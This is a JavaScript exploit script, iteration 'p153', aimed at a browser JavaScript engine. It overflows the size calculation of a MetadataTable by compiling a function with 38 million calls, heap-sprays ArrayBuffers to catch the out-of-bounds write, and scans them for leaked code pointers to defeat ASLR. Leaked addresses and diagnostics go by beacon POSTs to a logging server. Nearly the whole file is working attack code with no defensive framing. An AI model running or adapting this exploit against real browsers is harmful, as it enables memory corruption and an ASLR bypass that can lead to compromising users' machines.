// p153 — MetadataTable overflow ASLR leak (CORRECTED)
//
// FIXES from p150f/p151a:
// 1. Spray size: 100112 bytes (sizeof(LinkingData)=16 + wrappedSize=100096)
//    Previous sprays used 100096 which is 16 bytes too small
// 2. Beacons use POST (not GET) — host.py only logs POST /beacon/
// 3. No function call needed — corruption during compilation only
//
// Beacon prefix: V153-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V153-' + tag + '?t=' + Date.now();
      if (body !== undefined && body !== null && body !== '') {
        navigator.sendBeacon(url, String(body).substring(0, 900));
      } else {
        navigator.sendBeacon(url);
      }
    } catch (e) {}
  }
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V153-' + tag + '?t=' + Date.now(), false);
      x.send('');
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function anyNonZero(view, off, len) {
    for (var b = 0; b < len; b++) { if (view[off + b] !== 0) return true; }
    return false;
  }

  BS('BOOT');

  // sizeof(LinkingData) = 16: { Ref<UnlinkedMetadataTable>(8), unsigned refCount(4), padding(4) }
  // totalSize after uint32 wrap: 38348816 * 112 mod 2^32 = 100096
  // MetadataTable allocation = sizeof(LinkingData) + totalSize = 16 + 100096 = 100112
  var BUF_SZ = 100112;
  var SPRAY_COUNT = 300;

  var sprays = [];
  var views = [];

  // Phase 1: Spray
  BS('SPRAY-START');
  for (var i = 0; i < SPRAY_COUNT; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    sprays.push(ab);
    views.push(new Uint8Array(ab));
  }
  BS('SPRAY-' + SPRAY_COUNT + '-SZ' + BUF_SZ);

  // Phase 2: Free even-indexed buffers to create holes
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    sprays[i] = null;
    views[i] = null;
  }
  BS('FREE-DONE');

  // Force GC to reclaim freed backing stores
  for (var g = 0; g < 8; g++) {
    var garbage = new Array(50000);
    for (var j = 0; j < 50000; j++) garbage[j] = new ArrayBuffer(256);
    garbage = null;
  }
  BS('GC-FORCED');

  // Count surviving buffers
  var alive = 0;
  for (var c = 0; c < views.length; c++) {
    if (views[c]) alive++;
  }
  BS('ALIVE-' + alive);

  // Phase 3: Compile 38M function
  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p153fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p153ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  var blobMB = Math.round(blob.size / 1048576);
  BS('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p153ok ? 'OK' : 'FAIL';
    BS('COMPILED-' + ok);
    if (ok === 'OK') setTimeout(phaseScan, 100);
    else BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;

  // Phase 4: Scan spray buffers for OOB writes
  function phaseScan() {
    BS('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;
    var leakedPtrs = [];

    // Scan odd-indexed buffers (adjacent to freed holes) first
    var scanOrder = [];
    for (var s = 1; s < views.length; s += 2) scanOrder.push(s);
    for (var s = 0; s < views.length; s += 2) scanOrder.push(s);

    for (var si = 0; si < scanOrder.length; si++) {
      var i = scanOrder[si];
      var view = views[i];
      if (!view) continue;

      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (hitBufs <= 3) {
          BS('HIT-' + i + '-nz' + nz + '-f' + firstOff);
        }

        // Auto-detect entry alignment: OOB entries at 112-byte stride
        // OOB data starts at offset 32 within spray buffer (entry 894 = 16+894*112-100112=32)
        // But verify by finding the base with most non-zero +24 fields at stride 112
        var bestBase = -1, bestHits = 0;
        for (var tryBase = 0; tryBase < 112; tryBase++) {
          var hits = 0;
          for (var tryOff = tryBase + 24; tryOff + 8 <= view.length; tryOff += 112) {
            if (anyNonZero(view, tryOff, 8)) hits++;
          }
          if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
        }
        var entryBase = bestBase >= 0 ? bestBase : firstOff;
        BS('EBASE-' + i + '-' + entryBase + '-hits' + bestHits);

        // Scan at stride 112 for thunk pointer at entry+24
        var ptrsDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= view.length && ptrsDumped < 10; entryOff += 112) {
          var ptrOff = entryOff + 24;
          if (ptrOff + 8 > view.length) break;
          if (!anyNonZero(view, ptrOff, 8)) continue;

          var hex = readHex8(view, ptrOff);
          var entryN = Math.round((entryOff - entryBase) / 112);
          B('THUNK-N' + entryN + '-O' + ptrOff + '=' + hex);
          ptrsDumped++;
          if (leakedPtrs.length < 5) leakedPtrs.push(hex);
        }

        // Check m_slowPathCount (entry+12) and m_bytecodeIndex (entry+68)
        var diagDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= view.length && diagDumped < 5; entryOff += 112) {
          var entryN = Math.round((entryOff - entryBase) / 112);
          var cntOff = entryOff + 12;
          if (cntOff + 4 <= view.length) {
            var cnt = readU32(view, cntOff);
            if (cnt !== 0) {
              B('CNT-N' + entryN + '=' + cnt.toString(16), '');
              diagDumped++;
            }
          }
          var idxOff = entryOff + 68;
          if (idxOff + 4 <= view.length) {
            var val = readU32(view, idxOff);
            if (val !== 0) {
              B('IDX-N' + entryN + '=' + val, '');
              diagDumped++;
            }
          }
        }

        // Raw dump first 512 bytes of first hit
        if (hitBufs === 1) {
          var chunks = '';
          var cc = 0;
          for (var off = 0; off + 8 <= 512 && off + 8 <= view.length; off += 8) {
            if (anyNonZero(view, off, 8) && cc < 20) {
              chunks += off + ':' + readHex8(view, off) + ' ';
              cc++;
            }
          }
          if (cc > 0) B('RAW-' + i, chunks.trim());
        }
      }
    }

    BS('RESULT-bufs' + hitBufs + '-nz' + totalNZ);

    if (hitBufs > 0 && leakedPtrs.length > 0) {
      BS('ASLR-LEAK');
      for (var p = 0; p < leakedPtrs.length; p++) {
        B('PTR' + p + '=' + leakedPtrs[p], '');
      }
    } else {
      BS('NO-LEAK');
    }

    BS('DONE');
  }
})();
